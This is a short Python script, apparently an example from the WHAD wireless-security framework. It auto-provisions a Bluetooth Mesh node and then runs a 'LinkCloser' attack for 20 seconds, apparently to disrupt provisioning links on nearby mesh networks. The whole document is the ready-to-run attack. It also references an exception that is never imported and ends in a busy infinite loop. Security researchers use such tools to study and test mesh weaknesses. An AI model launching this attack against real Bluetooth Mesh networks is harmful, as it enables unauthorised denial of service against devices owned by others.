from whad.device import WhadDevice
from whad.ble.exceptions import ConnectionLostException
import sys
from whad.btmesh.connector.provisionee import Provisionee
from whad.btmesh.attacker.link_closer import LinkCloserAttacker, LinkCloserConfiguration


if len(sys.argv) != 2:
    # Retrieve target interface
    print("Usage: %s [provisionee]" % sys.argv[0])
    exit(1)


interface = sys.argv[1]

try:
    dev = WhadDevice.create(interface)

    provisionee = Provisionee(dev)
    provisionee.start()
    provisionee.profile.auto_provision()

    print("Node is (auto) provisioned !")

    # Create the attacker object and launch the attack
    link_closer_conf = LinkCloserConfiguration(timeout=20)
    link_closer = LinkCloserAttacker(
        connector=provisionee, configuration=link_closer_conf
    )

    print("Lauching the LinkCloser attacker for 20 seconds")
    link_closer.launch(asynch=False)

    link_closer.show_result()

except ConnectionLostException as e:
    print("Connection lost", e)

except (KeyboardInterrupt, SystemExit):
    dev.close()

except WhadDeviceNotFound:
    print("[e] Device not found")
    exit(1)
while True:
    pass
